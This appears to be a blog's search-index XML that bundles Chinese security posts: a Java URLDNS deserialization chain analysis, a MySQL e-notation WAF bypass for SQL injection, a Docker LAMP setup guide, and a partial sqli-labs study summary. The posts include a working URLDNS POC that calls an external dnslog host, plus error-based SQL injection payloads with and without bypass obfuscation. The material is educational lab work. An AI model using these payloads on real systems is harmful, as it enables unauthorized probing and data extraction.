<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Java安全-URLDNS链分析</title>
    <url>//blogs/Java_URLDNS/</url>
    <content><![CDATA[<h3 id="Java反序列化漏洞"><a href="#Java反序列化漏洞" class="headerlink" title="Java反序列化漏洞"></a>Java反序列化漏洞</h3><p>一个对象只要实现了Serilizable接口，这个对象就可以被序列化。</p>
<p>Java序列化是指把Java对象转换为字节序列，反序列化则是指把字节序列恢复为Java对象。(用transient关键字修饰的属性不参与序列化过程)</p>
<p>ObjectOutputStream类的writeObject()方法可以实现序列化，ObjectInputStream类的</p>
<p>readObject()方法用于反序列化。</p>
<p>序列化和反序列化本身是没有问题的，但是如果反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p>
<h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>URLDNS是一条比较简单的Java反序列化利用链，这条链不依赖于第三方库，对JDK版本也没有要求，经常用于检测反序列化漏洞。URLDNS链只能发起DNS请求，不能进行其他利用。</p>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>java.util.HashMap实现了Serializable接口，重写了readObject，在反序列化时会调用hash函数计算key的hashCode，而java.net.URL的hashCode在计算时会调用getHostAddress来解析域名，从而发出DNS请求。</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>HashMap：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;&#125;</span><br></pre></td></tr></table></figure>

<p>HashMap中，实现了Serializable接口，并且重写了readObject()方法，跟过去看</p>
<p>HashMap#readObject：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        reinitialize();</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                             loadFactor);</span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">        <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                             mappings);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">            <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">            <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">            <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">            <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                       DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                       (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                       MAXIMUM_CAPACITY :</span><br><span class="line">                       tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">            <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                         (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">            <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">            <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">            table = tab;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了hash()方法来处理key，跟进hash()方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="type">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里又调用了key.hashCode()方法，这个时候就看哪个序列化的类中有hashCode()方法，URLDNS链中给出了URL类，那就跟进到这个类的hashCode()方法看下</p>
<p>URL#hashCode：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当hashCode等于-1时(默认为-1)，会进行handler.hashCode(this)计算，跟进handler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br></pre></td></tr></table></figure>

<p>跟进URLStreamHandler#hashCode()：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the protocol part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">        <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">            h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the host part.</span></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">        <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">            h += addr.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">            <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">                h += host.toLowerCase().hashCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the file part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">        <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">            h += file.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the port part.</span></span><br><span class="line">        <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">            h += getDefaultPort();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            h += u.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Generate the ref part.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">        <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">            h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>u是传入的URL，getProtocol()方法是获取url的协议名称，再跟踪一下getHostAddress()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (hostAddress != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> hostAddress;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span> || host.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            hostAddress = InetAddress.getByName(host);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException | SecurityException ex) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hostAddress;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用了getByName()方法，，这个方法是用来确定主机的IP地址，这个时候就会触发一次请求</p>
<p><strong>调用链：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()-&gt;HashMap.putVal()-&gt;HashMap.hash()-&gt;URL.hashCode()-&gt;URLStreamHandler.hashCode().getHostAddress-&gt;URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName</span><br></pre></td></tr></table></figure>

<p>在put()方法中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>也会调用hash()方法，从而触发请求，所以为了避免这一次的dns查询(防止本机与目标机器发送的dns请求混淆)，可以通过反射将hashCode设置为不为-1的其他值。</p>
<p><strong>POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://y5e3jl.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>); <span class="comment">//绕过Java语言权限控制检查的权限</span></span><br><span class="line">        f.set(url,<span class="number">10086</span>); <span class="comment">//设置hashcode的值为-1的其他任何数字</span></span><br><span class="line">        map.put(url,<span class="string">&quot;evi13&quot;</span>); <span class="comment">// 调用HashMap对象中的put方法,此时因为hashcode不为-1,不再触发dns查询</span></span><br><span class="line">        f.set(url,-<span class="number">1</span>); <span class="comment">// 将hashcode重新设置为-1，确保在反序列化成功触发</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            outputStream.writeObject(map);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;urldns.ser&quot;</span>);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">            fileInputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java</tag>
        <tag>反序列化</tag>
        <tag>URLDNS</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入Bypass-科学计数法</title>
    <url>//blogs/sql_Bypass/</url>
    <content><![CDATA[<h1 id="1-前置知识"><a href="#1-前置知识" class="headerlink" title="1.前置知识"></a>1.前置知识</h1><p>科学记数法，特别是e记数法，已经集成到包括SQL在内的许多变成语言中，经过测试，e记数法在指定符号前会被忽略</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() 。, | &amp; % * ^ /</span><br></pre></td></tr></table></figure>

<p>比如我们新建一个查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username,password from tb_user where id =&#x27;1&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| zhangsan | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>加入e记数法之后为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username 1.e,password from tb_user where id =&#x27;1&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| zhangsan | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>且1.e中的数字无关紧要，任何数字都可以位于点和e之间，并且点是必须的（如1561.161e）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username 1561.161e,password from tb_user where id =&#x27;1&#x27;;</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| zhangsan | 123      |</span><br><span class="line">+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h1 id="2-应用"><a href="#2-应用" class="headerlink" title="2.应用"></a>2.应用</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;+and+updatexml(1,concat(0x7e,(user()),0x7e),3)#</span><br></pre></td></tr></table></figure>

<p>这是一个无waf情况的可以爆出数据库用户的payload，在有waf的情况下即会被拦截</p>
<p><img src="/../images/SQL%E6%B3%A8%E5%85%A5Bypass-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95/image-20221222172236287.png" alt="image-20221222172236287"></p>
<p>使用e记数法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27;+and+updatexml+1.e(1,concat+1.e(0x7e,(user+1.e()),0x7e),3)#</span><br></pre></td></tr></table></figure>

<p><img src="/../images/SQL%E6%B3%A8%E5%85%A5Bypass-%E7%A7%91%E5%AD%A6%E8%AE%A1%E6%95%B0%E6%B3%95/image-20221222172434593.png" alt="image-20221222172434593"></p>
<h1 id="3-参考"><a href="#3-参考" class="headerlink" title="3.参考"></a>3.参考</h1><p><a href="https://blog.mo60.cn/index.php/archives/788.html">mysql科学计数法之sql注入bypass - JunBlog (mo60.cn)</a></p>
]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下Docker部署LAMP踩的小坑</title>
    <url>//blogs/docker_LAMP/</url>
    <content><![CDATA[<h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h2><p>安装了Docker的Linux系统</p>
<h2 id="2-获取ubuntu基础镜像"><a href="#2-获取ubuntu基础镜像" class="headerlink" title="2.获取ubuntu基础镜像"></a>2.获取ubuntu基础镜像</h2><p>拉一个18.04版本的ubuntu镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu:18.04</span><br></pre></td></tr></table></figure>

<p>进入容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu:18.04 /bin/bash</span><br></pre></td></tr></table></figure>

<p>换源,这里我选择的是阿里云的源,因为镜像中没有安装vim,所以用echo写入内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mv /etc/apt/sources.list /etc/apt/sources.list.bak	#备份源文件</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse&quot; &gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br><span class="line">echo &quot;deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse&quot; &gt;&gt;/etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>更新源列表</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<h2 id="3-安装依赖"><a href="#3-安装依赖" class="headerlink" title="3.安装依赖"></a>3.安装依赖</h2><h3 id="3-1-Mysql"><a href="#3-1-Mysql" class="headerlink" title="3.1 Mysql"></a>3.1 Mysql</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install mysql-server</span><br></pre></td></tr></table></figure>

<p><strong>坑:</strong></p>
<p>安装完成后启动mysql报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ERROR 2002 (HY000): Can&#x27;t connect to local MySQL server through socket &#x27;/var/run/mysqld/mysqld.sock&#x27; (2)</span><br></pre></td></tr></table></figure>

<p><strong>解决方案:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p /var/run/mysqld</span><br><span class="line">chown mysql /var/run/mysqld/</span><br><span class="line">service mysql restart</span><br><span class="line">mysql	//进入mysql</span><br><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;root&#x27;; //设置密码</span><br></pre></td></tr></table></figure>

<p>然后进入mysql,即可正常连接</p>
<h3 id="3-2-Apache"><a href="#3-2-Apache" class="headerlink" title="3.2 Apache"></a>3.2 Apache</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure>

<p><strong>坑</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Sat Nov 19 06:52:00.409930 2022] [core:warn] [pid 2080] AH00111: Config variable $&#123;APACHE_RUN_DIR&#125; is not defined</span><br><span class="line">apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot</span><br></pre></td></tr></table></figure>

<p><strong>解决方案:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /var/run/apache2</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>

<h3 id="3-3-PHP"><a href="#3-3-PHP" class="headerlink" title="3.3 PHP"></a>3.3 PHP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install php</span><br><span class="line">apt-get install php-mysql</span><br><span class="line">apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure>

<p>安装完后查看版本如下,即表示安装成功</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@447e37cf48ee:/etc/apache2/sites-enabled# php -version</span><br><span class="line">PHP 7.2.24-0ubuntu0.18.04.15 (cli) (built: Nov  2 2022 09:09:52) ( NTS )</span><br><span class="line">Copyright (c) 1997-2018 The PHP Group</span><br><span class="line">Zend Engine v3.2.0, Copyright (c) 1998-2018 Zend Technologies</span><br><span class="line">    with Zend OPcache v7.2.24-0ubuntu0.18.04.15, Copyright (c) 1999-2018, by Zend Technologies</span><br></pre></td></tr></table></figure>

<p><strong>坑</strong></p>
<p>在&#x2F;var&#x2F;www&#x2F;html下创建一个phpinfo文件,打开显示空白</p>
<p><strong>解决方案:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/php/7.2/apache2/php.ini</span><br></pre></td></tr></table></figure>

<p>首先看下<strong>disable_functions</strong>是否有phpinfo,再将<strong>short_open_tag &#x3D; Off</strong>取消注释并改为<strong>short_open_tag &#x3D; On</strong></p>
<h2 id="4-测试"><a href="#4-测试" class="headerlink" title="4.测试"></a>4.测试</h2><p>此时LAMP环境就搭好了,我们可以在创建一个php文件看是否能解析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/html</span><br><span class="line">vim test.php</span><br></pre></td></tr></table></figure>

<p>文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/Linux%E4%B8%8BDocker%E9%83%A8%E7%BD%B2LAMP%E8%B8%A9%E7%9A%84%E5%B0%8F%E5%9D%91/phpinfo.png" alt="phpinfo"></p>
<p>成功解析</p>
]]></content>
      <tags>
        <tag>Docker</tag>
        <tag>LAMP</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli靶场学习要点总结</title>
    <url>//blogs/sql_injection/</url>
    <content><![CDATA[<h1 id="1-项目准备"><a href="#1-项目准备" class="headerlink" title="1.项目准备"></a>1.项目准备</h1><p><strong>项目地址:</strong> <a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p>
<p><strong>环境:</strong> apache php5(支持mysql_connect()) mysql5以上(有information_schema系统表)</p>
<h1 id="2-要点总结"><a href="#2-要点总结" class="headerlink" title="2.要点总结"></a>2.要点总结</h1><h2 id="2-0-前置知识"><a href="#2-0-前置知识" class="headerlink" title="2.0 前置知识"></a>2.0 前置知识</h2><p>MySQL5.0版本以上存在一个重要的系统数据库information_schema,通过此数据库可访问MySQL中存在的数据库名,表明,字段名等元数据</p>
<ul>
<li><strong>infromation_schema.columns:</strong><ul>
<li>table_schema 数据库名</li>
<li>table_name 表名</li>
<li>column_name 列名</li>
</ul>
</li>
<li><strong>information_schema.tables:</strong><ul>
<li>table_schema 数据库名</li>
<li>table_name 表名</li>
</ul>
</li>
<li><strong>information_schema.schemata:</strong><ul>
<li>schema_name 数据库名</li>
</ul>
</li>
</ul>
<h2 id="2-1-常用闭合符号"><a href="#2-1-常用闭合符号" class="headerlink" title="2.1 常用闭合符号"></a>2.1 常用闭合符号</h2><ul>
<li>‘</li>
<li>“</li>
<li>)</li>
<li>‘)</li>
<li>“)</li>
</ul>
<h2 id="2-2-判断注入常用方法"><a href="#2-2-判断注入常用方法" class="headerlink" title="2.2 判断注入常用方法"></a>2.2 判断注入常用方法</h2><ul>
<li>使用闭合符号,让SQL语句不能正常闭合,导致页面报错</li>
<li>构造永真&#x2F;假式,观察返回结果</li>
<li>如果id&#x3D;9-1与id&#x3D;8返回相同,则证明参数值参与了运算,可能存在注入,同理还可利用加、乘、除</li>
</ul>
<h2 id="2-3-注入类型详解"><a href="#2-3-注入类型详解" class="headerlink" title="2.3 注入类型详解"></a>2.3 注入类型详解</h2><p>根据注入技术分类有一下五种:</p>
<ul>
<li>联合查询注入</li>
<li>报错注入</li>
<li>延时注入</li>
<li>布尔盲注</li>
<li>堆叠查询</li>
</ul>
<h3 id="2-3-1-联合查询注入"><a href="#2-3-1-联合查询注入" class="headerlink" title="2.3.1 联合查询注入"></a>2.3.1 联合查询注入</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>这种注入就是union注入,在MySQL中union为连接两条SQL语句并执行,前提为两边的输入应为相同的列数,如果数据类型不同的话,MySQL会进行隐式转换;同时,列的名称由第一个查询的列的名称决定,所以在进行联合查询前,应提前判断列数,判断列数时,可以使用order by。</p>
<p>在MySQL中,order by代表排序,有如图所示的一张表</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085050248.png" alt="image-20221201085050248"></p>
<p>可以利用order by 进行排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_user order by n;</span><br></pre></td></tr></table></figure>

<p>n可以为数字,也可以为字段,n为数字时,代表表中的第n个字段,即下面两个查询结果一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from tb_user order by password;</span><br><span class="line">select * from tb_user order by 3;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085417830.png" alt="image-20221201085417830"></p>
<p>如果数字超出字段数,即会报错</p>
<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201085617782.png" alt="image-20221201085617782"></p>
<p>我们即可利用这个特征进行字段数的判断,然后用union进行注入</p>
<p>union用法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from table1 union select * from table2;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sqli%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%A6%81%E7%82%B9%E6%80%BB%E7%BB%93/image-20221201090117321.png" alt="image-20221201090117321"></p>
<p>如果列数不同即会报错</p>
